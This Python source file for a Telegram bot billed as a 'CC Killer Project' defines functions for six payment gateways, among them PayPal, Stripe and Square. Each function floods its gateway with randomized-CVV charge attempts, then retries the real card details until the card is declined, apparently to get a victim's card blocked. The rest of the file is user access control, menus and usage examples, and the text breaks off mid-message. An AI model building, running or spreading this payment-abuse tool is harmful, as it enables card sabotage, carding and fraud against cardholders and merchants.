import asyncio
import base64
import logging
import os
import random
import re
import sqlite3
import threading
import time
import uuid
from datetime import datetime
from xml.etree import ElementTree as ET

import requests
from aiogram import Bot, Dispatcher, F
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode
from aiogram.filters import Command, CommandObject
from aiogram.types import (
    Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton,
)
from aiogram.exceptions import TelegramBadRequest
from dotenv import load_dotenv

load_dotenv()

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(name)s: %(message)s",
)
log = logging.getLogger("afuonaz")

TOKEN = os.getenv("BOT_TOKEN", "")
ADMIN_ID = int(os.getenv("ADMIN_ID", "0"))
ALLOWED_USERS_RAW = os.getenv("ALLOWED_USERS", "")

DATA_DIR = "data"
DB_PATH = os.path.join(DATA_DIR, "afuonaz.db")

PAYPAL_CLIENT_ID      = os.getenv("PAYPAL_CLIENT_ID", "YOUR_PAYPAL_CLIENT_ID")
PAYPAL_SECRET         = os.getenv("PAYPAL_SECRET", "YOUR_PAYPAL_SECRET")
STRIPE_KEY            = os.getenv("STRIPE_KEY", "sk_test_yourKeyHere")
SQUARE_TOKEN          = os.getenv("SQUARE_TOKEN", "YOUR_SQUARE_SANDBOX_TOKEN")
SQUARE_LOCATION_ID    = os.getenv("SQUARE_LOCATION_ID", "YOUR_LOCATION_ID")
AUTHORIZE_LOGIN_ID    = os.getenv("AUTHORIZE_LOGIN_ID", "YOUR_API_LOGIN_ID")
AUTHORIZE_TRANS_KEY   = os.getenv("AUTHORIZE_TRANS_KEY", "YOUR_TRANSACTION_KEY")
BRAINTREE_PUBLIC_KEY  = os.getenv("BRAINTREE_PUBLIC_KEY", "your_public_key")
BRAINTREE_PRIVATE_KEY = os.getenv("BRAINTREE_PRIVATE_KEY", "your_private_key")
SSLCOMMERZ_STORE_ID   = os.getenv("SSLCOMMERZ_STORE_ID", "your_store_id")
SSLCOMMERZ_PASSWORD   = os.getenv("SSLCOMMERZ_PASSWORD", "your_store_password")


def kill_paypal(card_number, exp_month, exp_year, cvv_real, zip_real):
    out = []
    def p(x=""): out.append(str(x))

    p("=" * 50)
    p("💳 PAYPAL CARD KILLER (LIVE API FLOW)")
    p("=" * 50)

    client_id = PAYPAL_CLIENT_ID
    secret = PAYPAL_SECRET
    paypal_token_url = "https://api-m.sandbox.paypal.com/v1/oauth2/token"

    state = {"loading": True}
    start_time = time.time()

    def get_paypal_token():
        try:
            auth = base64.b64encode(f"{client_id}:{secret}".encode()).decode()
            headers = {
                "Authorization": f"Basic {auth}",
                "Content-Type": "application/x-www-form-urlencoded",
            }
            data = {"grant_type": "client_credentials"}
            r = requests.post(paypal_token_url, headers=headers, data=data, timeout=15)
            return r.json().get("access_token", "")
        except Exception:
            return ""

    def animate_loading():
        bar = ["[⏳     ]", "[⏳⏳    ]", "[⏳⏳⏳   ]", "[⏳⏳⏳⏳  ]",
               "[⏳⏳⏳⏳⏳ ]", "[⏳⏳⏳⏳⏳⏳]"]
        while state["loading"]:
            for stage in bar:
                p(f"Processing {stage}")
                time.sleep(0.3)

    def paypal_charge(cvv, zip_code, month, year, token):
        try:
            headers = {
                "Authorization": f"Bearer {token}",
                "Content-Type": "application/json",
            }
            data = {
                "number": card_number,
                "type": "visa",
                "expire_month": int(month),
                "expire_year": int("20" + year),
                "cvv2": cvv,
                "first_name": "Test",
                "last_name": "User",
                "billing_address": {
                    "line1": "123 Main St",
                    "city": "San Jose",
                    "state": "CA",
                    "postal_code": zip_code,
                    "country_code": "US",
                },
            }
            response = requests.post(
                "https://api-m.sandbox.paypal.com/v1/vault/credit-cards",
                json=data, headers=headers, timeout=15,
            )
            j = response.json()
            if "id" in j:
                return "approved"
            elif "error" in j:
                return "declined"
            return "error"
        except Exception:
            return "timeout"

    def kill_card():
        attempt = 0
        killed = False
        token = get_paypal_token()
        if not token:
            state["loading"] = False
            p("[✖] Failed to get PayPal token")
            return
        while not killed:
            for _ in range(4):
                fake_cvv = str(random.randint(100, 999))
                fake_zip = str(random.randint(10000, 99999))
                fake_month = str(random.randint(1, 12)).zfill(2)
                fake_year = str(random.randint(25, 30))
                attempt += 1
                res = paypal_charge(fake_cvv, fake_zip, fake_month, fake_year, token)
                p(f"[Attempt {attempt}] Fake charge: {res}")
            res = paypal_charge(cvv_real, zip_real, exp_month, exp_year, token)
            if res == "declined":
                killed = True
            else:
                p("[✓] Card still alive... Retrying!")
        state["loading"] = False
        duration = round(time.time() - start_time, 2)
        p(f"💀 CARD SUCCESSFULLY KILLED! [Time: {duration}s]")

    t1 = threading.Thread(target=animate_loading)
    t2 = threading.Thread(target=kill_card)
    t1.start()
    t2.start()
    t2.join()
    state["loading"] = False

    return True, "\n".join(out)


def kill_stripe(card_number, exp_month, exp_year, cvv_real, zip_real):
    out = []
    def p(x=""): out.append(str(x))

    p("=" * 50)
    p("💳 STRIPE CARD KILLER (LIVE API FLOW)")
    p("=" * 50)

    stripe_api_url = "https://api.stripe.com/v1/payment_methods"
    stripe_key = STRIPE_KEY

    state = {"loading": True}
    start_time = time.time()

    def animate_loading():
        bar = ["[⏳     ]", "[⏳⏳    ]", "[⏳⏳⏳   ]", "[⏳⏳⏳⏳  ]",
               "[⏳⏳⏳⏳⏳ ]", "[⏳⏳⏳⏳⏳⏳]"]
        while state["loading"]:
            for stage in bar:
                p(f"Processing {stage}")
                time.sleep(0.3)

    def stripe_charge(cvv, zip_code, month, year):
        try:
            headers = {"Authorization": f"Bearer {stripe_key}"}
            data = {
                "type": "card",
                "card[number]": card_number,
                "card[exp_month]": month,
                "card[exp_year]": year,
                "card[cvc]": cvv,
                "billing_details[address][postal_code]": zip_code,
            }
            response = requests.post(stripe_api_url, headers=headers, data=data, timeout=15)
            result = response.json()
            if response.status_code == 200 and "id" in result:
                return "approved"
            elif "error" in result:
                return "declined"
            return "error"
        except Exception:
            return "timeout"

    def kill_card():
        attempt = 0
        killed = False
        while not killed:
            for _ in range(4):
                fake_cvv = str(random.randint(100, 999))
                fake_zip = str(random.randint(10000, 99999))
                fake_month = str(random.randint(1, 12)).zfill(2)
                fake_year = str(random.randint(25, 30))
                attempt += 1
                res = stripe_charge(fake_cvv, fake_zip, fake_month, fake_year)
                p(f"[Attempt {attempt}] Fake charge: {res}")
            res = stripe_charge(cvv_real, zip_real, exp_month, exp_year)
            if res == "declined":
                killed = True
            else:
                p("[✓] Card still alive... Retrying!")
        state["loading"] = False
        duration = round(time.time() - start_time, 2)
        p(f"💀 CARD SUCCESSFULLY KILLED! [Time: {duration}s]")

    t1 = threading.Thread(target=animate_loading)
    t2 = threading.Thread(target=kill_card)
    t1.start()
    t2.start()
    t2.join()
    state["loading"] = False

    return True, "\n".join(out)


def kill_square(card_number, exp_month, exp_year, cvv_real, zip_real):
    out = []
    def p(x=""): out.append(str(x))

    p("=" * 50)
    p("💳 SQUARE CARD KILLER (LIVE API FLOW)")
    p("=" * 50)

    square_token = SQUARE_TOKEN
    square_location_id = SQUARE_LOCATION_ID

    state = {"loading": True}
    start_time = time.time()

    def animate_loading():
        bar = ["[🟨     ]", "[🟨🟨    ]", "[🟨🟨🟨   ]", "[🟨🟨🟨🟨  ]",
               "[🟨🟨🟨🟨🟨 ]", "[🟨🟨🟨🟨🟨🟨]"]
        while state["loading"]:
            for stage in bar:
                p(f"Processing {stage}")
                time.sleep(0.3)

    def square_charge(cvv, zip_code, month, year):
        try:
            payload = {
                "idempotency_key": str(uuid.uuid4()),
                "autocomplete": False,
                "amount_money": {"amount": 100, "currency": "USD"},
                "source_id": "cnon:card-nonce-ok",
                "card_details": {
                    "card": {
                        "number": card_number,
                        "exp_month": int(month),
                        "exp_year": int("20" + year),
                        "cvv": cvv,
                        "postal_code": zip_code,
                    }
                },
                "location_id": square_location_id,
            }
            headers = {
                "Authorization": f"Bearer {square_token}",
                "Content-Type": "application/json",
            }
            response = requests.post(
                "https://connect.squareupsandbox.com/v2/payments",
                json=payload, headers=headers, timeout=15,
            )
            j = response.json()
            if "payment" in j:
                return "approved"
            elif "errors" in j:
                return "declined"
            return "error"
        except Exception:
            return "timeout"

    def kill_card():
        attempt = 0
        killed = False
        while not killed:
            for _ in range(3):
                fake_cvv = str(random.randint(100, 999))
                fake_zip = str(random.randint(10000, 99999))
                fake_month = str(random.randint(1, 12)).zfill(2)
                fake_year = str(random.randint(25, 30))
                attempt += 1
                res = square_charge(fake_cvv, fake_zip, fake_month, fake_year)
                p(f"[Attempt {attempt}] Fake charge: {res}")
            res = square_charge(cvv_real, zip_real, exp_month, exp_year)
            if res == "declined":
                killed = True
            else:
                p("[✓] Card still alive... Retrying!")
        state["loading"] = False
        duration = round(time.time() - start_time, 2)
        p(f"💀 CARD SUCCESSFULLY KILLED! [Time: {duration}s]")

    t1 = threading.Thread(target=animate_loading)
    t2 = threading.Thread(target=kill_card)
    t1.start()
    t2.start()
    t2.join()
    state["loading"] = False

    return True, "\n".join(out)


def kill_authorize(card_number, exp_month, exp_year, cvv_real, zip_real):
    out = []
    def p(x=""): out.append(str(x))

    p("=" * 50)
    p("💳 AUTHORIZE.NET CARD KILLER (LIVE API FLOW)")
    p("=" * 50)

    api_login_id = AUTHORIZE_LOGIN_ID
    transaction_key = AUTHORIZE_TRANS_KEY

    state = {"loading": True}
    start_time = time.time()

    def animate_loading():
        bar = ["[🟦     ]", "[🟦🟦    ]", "[🟦🟦🟦   ]", "[🟦🟦🟦🟦  ]",
               "[🟦🟦🟦🟦🟦 ]", "[🟦🟦🟦🟦🟦🟦]"]
        while state["loading"]:
            for stage in bar:
                p(f"Processing {stage}")
                time.sleep(0.3)

    def send_authnet_request(cvv, zip_code, month, year):
        exp_date = f"{month}/{year}"
        payload = f"""<?xml version="1.0" encoding="utf-8"?>
        <createTransactionRequest xmlns="AnetApi/xml/v1/schema/AnetApiSchema.xsd">
          <merchantAuthentication>
            <name>{api_login_id}</name>
            <transactionKey>{transaction_key}</transactionKey>
          </merchantAuthentication>
          <transactionRequest>
            <transactionType>authCaptureTransaction</transactionType>
            <amount>1.00</amount>
            <payment>
              <creditCard>
                <cardNumber>{card_number}</cardNumber>
                <expirationDate>{exp_date}</expirationDate>
                <cardCode>{cvv}</cardCode>
              </creditCard>
            </payment>
            <billTo>
              <zip>{zip_code}</zip>
            </billTo>
          </transactionRequest>
        </createTransactionRequest>
        """
        headers = {"Content-Type": "application/xml"}
        try:
            response = requests.post(
                url="https://apitest.authorize.net/xml/v1/request.api",
                data=payload, headers=headers, timeout=15,
            )
            xml_response = ET.fromstring(response.content)
            status = xml_response.find(".//messages/resultCode").text
            direct = xml_response.find(".//directResponse")
            direct = direct.text if direct is not None else ""
            if status == "Ok" and ",1," in direct:
                return "approved"
            elif status == "Ok" and ",2," in direct:
                return "declined"
            return "error"
        except Exception:
            return "timeout"

    def kill_card():
        attempt = 0
        killed = False
        while not killed:
            for _ in range(4):
                fake_cvv = str(random.randint(100, 999))
                fake_zip = str(random.randint(10000, 99999))
                fake_month = str(random.randint(1, 12)).zfill(2)
                fake_year = str(random.randint(25, 30))
                attempt += 1
                res = send_authnet_request(fake_cvv, fake_zip, fake_month, fake_year)
                p(f"[Attempt {attempt}] Fake charge: {res}")
            res = send_authnet_request(cvv_real, zip_real, exp_month, exp_year)
            if res == "declined":
                killed = True
            else:
                p("[✓] Card still alive... Retrying!")
        state["loading"] = False
        duration = round(time.time() - start_time, 2)
        p(f"💀 CARD SUCCESSFULLY KILLED! [Time: {duration}s]")

    t1 = threading.Thread(target=animate_loading)
    t2 = threading.Thread(target=kill_card)
    t1.start()
    t2.start()
    t2.join()
    state["loading"] = False

    return True, "\n".join(out)


def kill_braintree(card_number, exp_month, exp_year, cvv_real, zip_real):
    out = []
    def p(x=""): out.append(str(x))

    p("=" * 50)
    p("💳 BRAINTREE CARD KILLER (LIVE API FLOW)")
    p("=" * 50)

    BT_PUBLIC_KEY = BRAINTREE_PUBLIC_KEY
    BT_PRIVATE_KEY = BRAINTREE_PRIVATE_KEY

    auth_string = f"{BT_PUBLIC_KEY}:{BT_PRIVATE_KEY}"
    encoded_auth = base64.b64encode(auth_string.encode()).decode()
    headers = {
        "Authorization": f"Basic {encoded_auth}",
        "Content-Type": "application/json",
    }
    gateway_url = "https://payments.sandbox.braintree-api.com/graphql"

    state = {"loading": True}
    start_time = time.time()

    def animate_loading():
        bar = ["[⬛⬜⬜⬜⬜]", "[⬛⬛⬜⬜⬜]", "[⬛⬛⬛⬜⬜]",
               "[⬛⬛⬛⬛⬜]", "[⬛⬛⬛⬛⬛]"]
        while state["loading"]:
            for stage in bar:
                p(f"Processing {stage}")
                time.sleep(0.3)

    def send_braintree_charge(cvv, zip_code, month, year):
        payload = {
            "query": """
            mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {
              tokenizeCreditCard(input: $input) {
                paymentMethod { id }
              }
            }
            """,
            "variables": {
                "input": {
                    "creditCard": {
                        "number": card_number,
                        "expirationMonth": month,
                        "expirationYear": year,
                        "cvv": cvv,
                        "billingAddress": {"postalCode": zip_code},
                    }
                }
            },
        }
        try:
            response = requests.post(gateway_url, json=payload, headers=headers, timeout=15)
            data = response.json()
            if "errors" in data:
                return "declined"
            elif "paymentMethod" in data.get("data", {}).get("tokenizeCreditCard", {}):
                return "approved"
            return "error"
        except Exception:
            return "timeout"

    def kill_card():
        attempt = 0
        killed = False
        while not killed:
            for _ in range(5):
                fake_cvv = str(random.randint(100, 999))
                fake_zip = str(random.randint(10000, 99999))
                fake_month = str(random.randint(1, 12)).zfill(2)
                fake_year = str(random.randint(2025, 2030))
                attempt += 1
                res = send_braintree_charge(fake_cvv, fake_zip, fake_month, fake_year)
                p(f"[Attempt {attempt}] Fake charge: {res}")
            res = send_braintree_charge(cvv_real, zip_real, exp_month, exp_year)
            if res == "declined":
                killed = True
            else:
                p("[✓] Card still alive... Retrying!")
        state["loading"] = False
        duration = round(time.time() - start_time, 2)
        p(f"💀 CARD SUCCESSFULLY KILLED! [Time: {duration}s]")

    t1 = threading.Thread(target=animate_loading)
    t2 = threading.Thread(target=kill_card)
    t1.start()
    t2.start()
    t2.join()
    state["loading"] = False

    return True, "\n".join(out)


def kill_sslcommerz(card_number, exp_month, exp_year, cvv_real, zip_real):
    out = []
    def p(x=""): out.append(str(x))

    p("=" * 50)
    p("💳 SSLCommerz Card Killer (LIVE ATTEMPT FLOW)")
    p("=" * 50)

    store_id = SSLCOMMERZ_STORE_ID
    store_passwd = SSLCOMMERZ_PASSWORD
    init_url = "https://sandbox.sslcommerz.com/gwprocess/v4/api.php"

    state = {"loading": True}
    start_time = time.time()

    def animate_loading():
        bar = ["[⬛⬜⬜⬜⬜]", "[⬛⬛⬜⬜⬜]", "[⬛⬛⬛⬜⬜]",
               "[⬛⬛⬛⬛⬜]", "[⬛⬛⬛⬛⬛]"]
        while state["loading"]:
            for stage in bar:
                p(f"Processing {stage}")
                time.sleep(0.3)

    def send_sslcommerz_charge(cvv, zip_code, month, year):
        trx_id = f"TX{random.randint(100000, 999999)}"
        payload = {
            "store_id": store_id,
            "store_passwd": store_passwd,
            "total_amount": "1",
            "currency": "BDT",
            "tran_id": trx_id,
            "success_url": "https://yourdomain.com/success",
            "fail_url": "https://yourdomain.com/fail",
            "cancel_url": "https://yourdomain.com/cancel",
            "emi_option": "0",
            "cus_name": "Test User",
            "cus_email": "test@example.com",
            "cus_add1": "123 Test Address",
            "cus_city": "Dhaka",
            "cus_state": "Dhaka",
            "cus_postcode": zip_code,
            "cus_country": "Bangladesh",
            "cus_phone": "01711111111",
            "shipping_method": "NO",
            "product_name": "Test Product",
            "product_category": "Test",
            "product_profile": "general",
            "card_number": card_number,
            "card_expiry": f"{month}/{str(year)[-2:]}",
            "card_cvc": cvv,
        }
        try:
            response = requests.post(init_url, data=payload, timeout=15)
            data = response.json()
            if data.get("status") == "FAILED":
                return "declined"
            elif data.get("status") == "SUCCESS":
                return "approved"
            return "error"
        except Exception:
            return "timeout"

    def kill_card():
        attempt = 0
        killed = False
        while not killed:
            for _ in range(4):
                fake_cvv = str(random.randint(100, 999))
                fake_zip = str(random.randint(10000, 99999))
                fake_month = str(random.randint(1, 12)).zfill(2)
                fake_year = str(random.randint(2025, 2030))
                attempt += 1
                res = send_sslcommerz_charge(fake_cvv, fake_zip, fake_month, fake_year)
                p(f"[Attempt {attempt}] Fake attempt: {res}")
            res = send_sslcommerz_charge(cvv_real, zip_real, exp_month, exp_year)
            if res == "declined":
                killed = True
            else:
                p("[✓] Card still alive, retrying...")
        state["loading"] = False
        duration = round(time.time() - start_time, 2)
        p(f"💀 CARD SUCCESSFULLY KILLED! [Time: {duration}s]")

    t1 = threading.Thread(target=animate_loading)
    t2 = threading.Thread(target=kill_card)
    t1.start()
    t2.start()
    t2.join()
    state["loading"] = False

    return True, "\n".join(out)


KILLERS = {
    "paypal":     kill_paypal,
    "stripe":     kill_stripe,
    "square":     kill_square,
    "authorize":  kill_authorize,
    "braintree":  kill_braintree,
    "sslcommerz": kill_sslcommerz,
}


_local = threading.local()
_db_lock = threading.Lock()


def _get_conn():
    if not hasattr(_local, "conn") or _local.conn is None:
        os.makedirs(DATA_DIR, exist_ok=True)
        _local.conn = sqlite3.connect(DB_PATH, check_same_thread=False)
        _local.conn.row_factory = sqlite3.Row
    return _local.conn


def init_db():
    with _db_lock:
        conn = _get_conn()
        conn.executescript("""
        CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY,
            username TEXT,
            first_name TEXT,
            is_allowed INTEGER DEFAULT 1,
            added_by INTEGER,
            added_at TEXT,
            last_seen TEXT
        );
        CREATE TABLE IF NOT EXISTS settings (
            key TEXT PRIMARY KEY,
            value TEXT
        );
        CREATE INDEX IF NOT EXISTS idx_users_allowed ON users(is_allowed);
        """)
        conn.commit()


def get_user(user_id):
    conn = _get_conn()
    row = conn.execute("SELECT * FROM users WHERE user_id = ?", (user_id,)).fetchone()
    return dict(row) if row else None


def add_user(user_id, username="", first_name="", added_by=None):
    conn = _get_conn()
    now = datetime.utcnow().isoformat()
    conn.execute("""
        INSERT INTO users (user_id, username, first_name, is_allowed, added_by, added_at, last_seen)
        VALUES (?, ?, ?, 1, ?, ?, ?)
        ON CONFLICT(user_id) DO UPDATE SET
            username = excluded.username,
            first_name = excluded.first_name,
            is_allowed = 1,
            last_seen = excluded.last_seen
    """, (user_id, username, first_name, added_by, now, now))
    conn.commit()


def update_last_seen(user_id):
    conn = _get_conn()
    conn.execute("UPDATE users SET last_seen = ? WHERE user_id = ?",
                 (datetime.utcnow().isoformat(), user_id))
    conn.commit()


def remove_user(user_id):
    conn = _get_conn()
    conn.execute("UPDATE users SET is_allowed = 0 WHERE user_id = ?", (user_id,))
    conn.commit()


def list_users():
    conn = _get_conn()
    rows = conn.execute("SELECT * FROM users WHERE is_allowed = 1 ORDER BY added_at DESC").fetchall()
    return [dict(r) for r in rows]


def get_setting(key, default=None):
    conn = _get_conn()
    row = conn.execute("SELECT value FROM settings WHERE key = ?", (key,)).fetchone()
    return row["value"] if row else default


def set_setting(key, value):
    conn = _get_conn()
    conn.execute(
        "INSERT INTO settings (key, value) VALUES (?, ?) "
        "ON CONFLICT(key) DO UPDATE SET value = excluded.value",
        (key, str(value))
    )
    conn.commit()


PREMIUM_EMOJI_IDS = {
    "🔍": "5258396243666681152", "📊": "5445146408153806223",
    "📈": "5134457377428341766", "👤": "5445174334031166029",
    "👥": "5454371323595744068", "👑": "5303547611351902889",
    "📋": "5445146408153806223", "📝": "5444860552310457690",
    "⭐": "5343636681473935403", "✅": "5444987348334965906",
    "❌": "5121063440311386962", "⚠️": "4915853119839011973",
    "🚫": "5116151848855667552", "🔙": "5445365692004071819",
    "🆔": "5447311106030726740", "💰": "5301275719681190738",
    "📦": "5447448489149625830", "🔄": "5454245266305604993",
    "⚙️": "4915853119839011973", "💡": "5301275719681190738",
    "⏳": "5258113901106580375", "🎉": "5283031441637148958",
    "🚀": "4904936030232117798", "💬": "5447510826304959724",
    "🛑": "5116151848855667552", "📢": "5303547611351902889",
    "💳": "5301275719681190738", "▶️": "5445350109862720603",
    "ℹ️": "5305618829265628111",
}


def premium_emoji(text):
    if not text:
        return text
    result = text
    for emoji, emoji_id in PREMIUM_EMOJI_IDS.items():
        result = result.replace(
            emoji,
            f'<tg-emoji emoji-id="{emoji_id}">{emoji}</tg-emoji>',
        )
    return result


def style_btn(text, callback_data=None, url=None, style=None):
    kwargs = {"text": text}
    if callback_data:
        kwargs["callback_data"] = callback_data
    if url:
        kwargs["url"] = url
    if style:
        kwargs["style"] = style
    try:
        return InlineKeyboardButton(**kwargs)
    except Exception:
        kwargs.pop("style", None)
        return InlineKeyboardButton(**kwargs)


def build_main_menu_kb(is_admin: bool = False):
    rows = []
    if is_admin:
        rows.append([style_btn("👑 𝐀𝐝𝐦𝐢𝐧 𝐏𝐚𝐧𝐞𝐥",
                               callback_data="menu_admin", style="danger")])
    return InlineKeyboardMarkup(inline_keyboard=rows) if rows else None


def kb_admin_panel():
    return InlineKeyboardMarkup(inline_keyboard=[
        [style_btn("👥 𝐔𝐬𝐞𝐫𝐬", callback_data="adm_users", style="primary"),
         style_btn("📊 𝐒𝐭𝐚𝐭𝐬", callback_data="adm_stats", style="primary")],
        [style_btn("ℹ️ 𝐂𝐨𝐦𝐦𝐚𝐧𝐝𝐬", callback_data="adm_commands", style="primary")],
        [style_btn("🔙 𝐁𝐚𝐜𝐤", callback_data="main_menu", style="danger")],
    ])


def kb_back_main():
    return InlineKeyboardMarkup(inline_keyboard=[
        [style_btn("🔙 𝐁𝐚𝐜𝐤", callback_data="main_menu", style="danger")],
    ])


def kb_back_admin():
    return InlineKeyboardMarkup(inline_keyboard=[
        [style_btn("🔙 𝐁𝐚𝐜𝐤", callback_data="menu_admin", style="danger")],
    ])


def is_admin(user_id: int) -> bool:
    return user_id == ADMIN_ID


def is_allowed(user_id: int) -> bool:
    if is_admin(user_id):
        return True
    user = get_user(user_id)
    if user and user.get("is_allowed"):
        return True
    if ALLOWED_USERS_RAW:
        env_list = {int(u.strip()) for u in ALLOWED_USERS_RAW.split(",") if u.strip().isdigit()}
        if user_id in env_list:
            return True
    conn = _get_conn()
    row = conn.execute("SELECT COUNT(*) as c FROM users WHERE is_allowed = 1").fetchone()
    if row["c"] == 0 and not ALLOWED_USERS_RAW:
        return True
    return False


async def check_access(message: Message) -> bool:
    if is_allowed(message.from_user.id):
        update_last_seen(message.from_user.id)
        return True

    text = (
        "🚫 <b>𝐀𝐜𝐜𝐞𝐬𝐬 𝐃𝐞𝐧𝐢𝐞𝐝</b>\n\n"
        "𝐘𝐨𝐮 𝐚𝐫𝐞 𝐧𝐨𝐭 𝐚𝐮𝐭𝐡𝐨𝐫𝐢𝐳𝐞𝐝 𝐭𝐨 𝐮𝐬𝐞 𝐭𝐡𝐢𝐬 𝐛𝐨𝐭.\n"
        "𝐏𝐥𝐞𝐚𝐬𝐞 𝐜𝐨𝐧𝐭𝐚𝐜𝐭 𝐭𝐡𝐞 𝐚𝐝𝐦𝐢𝐧 𝐭𝐨 𝐠𝐞𝐭 𝐚𝐜𝐜𝐞𝐬𝐬."
    )
    try:
        await message.answer(premium_emoji(text))
    except Exception:
        try:
            await message.answer(text)
        except Exception as e:
            log.error(f"check_access failed: {e}")
    return False


running_users: set[int] = set()


async def loading_animation(message: Message, text="𝐋𝐨𝐚𝐝𝐢𝐧𝐠", duration=1.5):
    stages = ["🔲⬜⬜⬜⬜", "🔲🔲⬜⬜⬜", "🔲🔲🔲⬜⬜", "🔲🔲🔲🔲⬜", "🔲🔲🔲🔲🔲"]
    end_time = asyncio.get_event_loop().time() + duration
    i = 0
    while asyncio.get_event_loop().time() < end_time:
        try:
            await message.edit_text(
                premium_emoji(f"⏳ <b>{text}</b>\n\n<code>{stages[i % len(stages)]}</code>")
            )
        except Exception:
            pass
        i += 1
        await asyncio.sleep(0.25)


def parse_card(text: str):
    text = (text or "").strip()
    if not text:
        return None, "❌ <b>𝐍𝐨 𝐜𝐚𝐫𝐝 𝐩𝐫𝐨𝐯𝐢𝐝𝐞𝐝.</b>"

    first_line = text.splitlines()[0].strip()

    if "|" in first_line:
        parts = [p.strip() for p in first_line.split("|") if p.strip()]
    else:
        parts = re.split(r"[\s,]+", first_line)

    if len(parts) < 5:
        return None, "❌ <b>𝐅𝐨𝐫𝐦𝐚𝐭:</b> <code>number|month|year|cvv|zip</code>"

    num, month, year, cvv, zc = parts[0], parts[1], parts[2], parts[3], parts[4]

    if not num.isdigit() or not (13 <= len(num) <= 19):
        return None, "❌ 𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐜𝐚𝐫𝐝 𝐧𝐮𝐦𝐛𝐞𝐫."
    if not (month.isdigit() and 1 <= int(month) <= 12):
        return None, "❌ 𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐦𝐨𝐧𝐭𝐡."
    if not year.isdigit():
        return None, "❌ 𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐲𝐞𝐚𝐫."
    if not (cvv.isdigit() and 3 <= len(cvv) <= 4):
        return None, "❌ 𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐂𝐕𝐕."
    if not zc.isdigit():
        return None, "❌ 𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐙𝐈𝐏."

    if len(year) == 4:
        year = year[2:]

    return {
        "card_number": num,
        "exp_month": month.zfill(2),
        "exp_year": year.zfill(2),
        "cvv": cvv,
        "zip": zc,
    }, None


async def execute_killer(message: Message, key: str, card_text: str = ""):
    user_id = message.from_user.id

    if not await check_access(message):
        return

    if user_id in running_users:
        await message.answer(premium_emoji(
            "⚠️ <b>𝐀𝐥𝐫𝐞𝐚𝐝𝐲 𝐫𝐮𝐧𝐧𝐢𝐧𝐠</b>\n"
            "𝐖𝐚𝐢𝐭 𝐟𝐨𝐫 𝐭𝐡𝐞 𝐜𝐮𝐫𝐫𝐞𝐧𝐭 𝐨𝐩𝐞𝐫𝐚𝐭𝐢𝐨𝐧 𝐭𝐨 𝐟𝐢𝐧𝐢𝐬𝐡."
        ))
        return

    if key not in KILLERS:
        await message.answer(premium_emoji("❌ 𝐔𝐧𝐤𝐧𝐨𝐰𝐧 𝐦𝐨𝐝𝐮𝐥𝐞."))
        return

    card, err = parse_card(card_text)
    if err:
        await message.answer(premium_emoji(
            f"{err}\n\n"
            f"<b>𝐄𝐱𝐚𝐦𝐩𝐥𝐞:</b>\n"
            f"<code>/{key} 4111111111111111|12|25|123|12345</code>"
        ))
        return

    masked = f"{card['card_number'][:6]}******{card['card_number'][-4:]}"

    running_users.add(user_id)
    try:
        status_msg = await message.answer(premium_emoji(
            f"🚀 <b>𝐏𝐫𝐞𝐩𝐚𝐫𝐢𝐧𝐠...</b>\n\n"
            f"💳 <b>𝐂𝐚𝐫𝐝:</b> <code>{masked}</code>\n"
            f"📅 <b>𝐄𝐱𝐩:</b> {card['exp_month']}/{card['exp_year']}\n"
            f"📮 <b>𝐙𝐈𝐏:</b> {card['zip']}"
        ))
    except Exception:
        status_msg = await message.answer(f"🚀 Preparing... {masked}")

    try:
        await loading_animation(status_msg, "𝐋𝐚𝐮𝐧𝐜𝐡𝐢𝐧𝐠", duration=1.5)

        try:
            await status_msg.edit_text(premium_emoji(
                f"⚙️ 𝐑𝐮𝐧𝐧𝐢𝐧𝐠 <b>{key.upper()}</b>\n\n"
                f"💳 <b>𝐂𝐚𝐫𝐝:</b> <code>{masked}</code>\n"
                f"⏳ 𝐓𝐡𝐢𝐬 𝐦𝐚𝐲 𝐭𝐚𝐤𝐞 𝐚 𝐰𝐡𝐢𝐥𝐞..."
            ))
        except Exception:
            pass

        func = KILLERS[key]

        def _run():
            try:
                return func(
                    card["card_number"],
                    card["exp_month"],
                    card["exp_year"],
                    card["cvv"],
                    card["zip"],
                )
            except Exception as e:
                return False, f"❌ Error: {e}"

        loop = asyncio.get_event_loop()
        ok, output = await loop.run_in_executor(None, _run)

        output = (output or "").strip() or "(no output)"
        if len(output) > 3500:
            output = output[:3500] + "\n...(truncated)"

        header = "✅ <b>𝐒𝐮𝐜𝐜𝐞𝐬𝐬</b>" if ok else "❌ <b>𝐅𝐚𝐢𝐥𝐞𝐝</b>"
        safe_output = (
            output.replace("&", "&amp;")
                  .replace("<", "&lt;")
                  .replace(">", "&gt;")
        )

        final_text = (
            f"{header}\n\n"
            f"💳 <b>𝐂𝐚𝐫𝐝:</b> <code>{masked}</code>\n"
            f"📄 <b>𝐌𝐨𝐝𝐮𝐥𝐞:</b> <code>{key.upper()}</code>\n\n"
            f"<pre>{safe_output}</pre>"
        )

        try:
            await status_msg.edit_text(premium_emoji(final_text))
        except TelegramBadRequest:
            await status_msg.edit_text(final_text)

    except Exception as e:
        log.exception("execute_killer failed")
        try:
            await status_msg.edit_text(f"❌ 𝐄𝐫𝐫𝐨𝐫: {e}")
        except Exception:
            pass
    finally:
        running_users.discard(user_id)


WELCOME_TEXT = (
    "╔══════════════════════════════════╗\n"
    "║          <b>𓆩𝗔𓆪 𝗙𝗨𝗢𝗡𝗔</b>              ║\n"
    "║      💳 𝐂𝐂 𝐊𝐢𝐥𝐥𝐞𝐫 𝐏𝐫𝐨𝐣𝐞𝐜𝐭       ║\n"
    "╚══════════════════════════════════╝\n\n"
    "<b>𝐔𝐬𝐚𝐠𝐞:</b>\n"
    "<code>/paypal number|month|year|cvv|zip</code>\n\n"
    "<b>𝐄𝐱𝐚𝐦𝐩𝐥𝐞:</b>\n"
    "<code>/paypal 4111111111111111|12|25|123|12345</code>\n\n"
    "<b>𝐀𝐯𝐚𝐢𝐥𝐚𝐛𝐥𝐞 𝐌𝐨𝐝𝐮𝐥𝐞𝐬:</b>\n"
